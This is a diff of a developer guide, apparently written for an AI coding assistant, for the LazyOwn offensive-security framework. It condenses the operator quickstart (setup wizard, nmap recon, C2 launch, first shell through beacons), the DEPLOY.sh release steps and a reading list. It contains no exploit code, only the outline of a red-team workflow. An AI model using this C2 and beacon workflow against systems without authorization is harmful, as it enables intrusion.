+`QUICKSTART.md`: canonical operator onboarding. **Manual** — update when flow changes. Sections: prereqs → clone + `bash install.sh` → `wizard` (7 steps: rhost, lhost, domain, device, os_id, api_key, wordlists) → recon (`ping` → `lazynmap` → `auto_populate` → `facts_show`) → C2 (`fast_run_as_r00t.sh` or `lazyc2`) → first shell (Go beacon or `blacksandbeacon`) → `collab_join` → command/files reference + troubleshooting.
 
-### `QUICKSTART.md`
-
-Canonical operator onboarding document. **Manually maintained** — update it
-whenever the operator flow changes (new step required, command renamed, etc.).
-Structure:
-1. Prerequisites (OS, Python, SecLists)
-2. Clone + `bash install.sh`
-3. `wizard` — 7-step guided setup (rhost, lhost, domain, device, os_id, api_key, wordlists)
-4. Recon (`ping` → `lazynmap` → `auto_populate` → `facts_show`)
-5. C2 (`fast_run_as_r00t.sh` or `lazyc2`)
-6. First shell (Go beacon or `blacksandbeacon` Linux C beacon)
-7. Invite teammates (`collab_join`)
-8. Command reference table + key files table + troubleshooting
-
-### `cli/wizard.py` contract
-
-The wizard must **never** import `lazyown.py` or `lazyc2.py` (Dependency
-Inversion). It takes a `params: dict` and a `save: Callable` — it never
-touches `payload.json` directly. All output goes through `rich`. Auto-detects
-`lhost` from the routing table and SecLists paths from known candidate dirs.
-
-Run from the CLI: `wizard` or `wizard --check` (readiness summary only).
-The shell calls `wizard` automatically on first launch when `rhost` is unset.
+`cli/wizard.py`: **never** imports `lazyown.py`/`lazyc2.py` (DIP). Takes `params: dict` + `save: Callable` — doesn't touch `payload.json` directly. Output via `rich`. Auto-detects `lhost` from routing table, SecLists from candidate dirs. Run: `wizard` or `wizard --check`. Auto-launched on first run when `rhost` unset.
 
 ---
 
 ## 15f. Release pipeline — `DEPLOY.sh`
 
-The deploy script is `DEPLOY.sh` at the repo root (not `./DEPLOY`). It:
-1. Rebuilds `README.md` from `UTILS.md`, `COMMANDS.md`, and `CHANGELOG.md`.
+`DEPLOY.sh` (repo root, not `./DEPLOY`):
+1. Rebuilds `README.md` from `UTILS.md` + `COMMANDS.md` + `CHANGELOG.md`.
 2. Regenerates `docs/index.html`.
-3. Prompts for commit type, typedesc, subject, and body.
-4. Increments the version in `version.json`.
-5. Creates a signed git commit and tag (`release/0.x.y`).
-6. Pushes to `origin/main` and creates a GitHub release.
+3. Prompts: commit type, typedesc, subject, body.
+4. Bumps `version.json`.
+5. Signed git commit + tag (`release/0.x.y`).
+6. Pushes `origin/main` + creates GH release.
 
-### Running non-interactively
+Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`
 
-```bash
-printf "1\nfeat\nsubject line\nbody text\n" | bash DEPLOY.sh --no-test
-```
+Type → bump: `feat/feature/fix/hotfix` = patch; `refactor/docs/test/style` = none; `release` = major; `patch` = minor.
 
-The four inputs are: commit type number (1–9), typedesc (e.g. `feat`),
-subject (one-line summary), body (detail paragraph).
+`--no-test` skips tests — only when verified separately.
 
-Commit type → version bump:
-
-| Type | Bump |
-|------|------|
-| feat, feature, fix, hotfix | patch (0.x.Y) |
-| refactor, docs, test, style | none (version unchanged) |
-| release | major (X.0.0) |
-| patch | minor (0.X.0) |
-
-`--no-test` skips the test suite. Use only when tests were already run
-separately and you are confident they pass.
-
-### What DEPLOY.sh does NOT do
-
-- It does not run `python -m pytest`. Run tests manually before deploying.
-- It does not validate `CLAUDE.md` content. Keep this file accurate by hand.
-- The `CHANGELOG.md` is truncated to 120 000 chars for the GitHub release
-  body. Full history is always in the file itself.
+**Does NOT**: run pytest; validate `CLAUDE.md`. `CHANGELOG.md` truncated to 120k chars in GH release body; full in file.
 
 ---
 
-## 16. Read these next
+## 16. Read next
 
-- `QUICKSTART.md` — **start here for a new operator session** — 5-minute clone-to-shell guide.
-- `README.md` — public-facing feature list (long, marketing-flavoured). Auto-regenerated by `DEPLOY.sh`.
-- `COMMANDS.md` — exhaustive list of every CLI command. Auto-generated.
-- `UTILS.md` — auto-generated reference for `utils.py`.
-- `CHANGELOG.md` — release history, useful for context on any flag you don't recognise.
-- `skills/lazyown.md` — full MCP playbook (mandatory reading before any MCP session).
-- `skills/README.md` — skills layer architecture and all 95 MCP tools.
-- `<dir>/README.md` — every directory has one; read it before editing files in that directory.
+- `QUICKSTART.md` — start here for a new operator session.
+- `README.md` — public feature list (auto-regenerated by `DEPLOY.sh`).
+- `COMMANDS.md` — every CLI command (auto-generated).
+- `UTILS.md` — `utils.py` reference (auto-generated).
+- `CHANGELOG.md` — release history.
+- `skills/lazyown.md` — MCP playbook (mandatory before MCP session).
+- `skills/README.md` — skills architecture + 95 MCP tools.
+- `<dir>/README.md` — every directory; read before editing.
 
-When in doubt: read `payload.json`, read `sessions/`, read the directory's `README.md`, then write code.
+When in doubt: read `payload.json` → `sessions/` → directory's `README.md` → then write code.
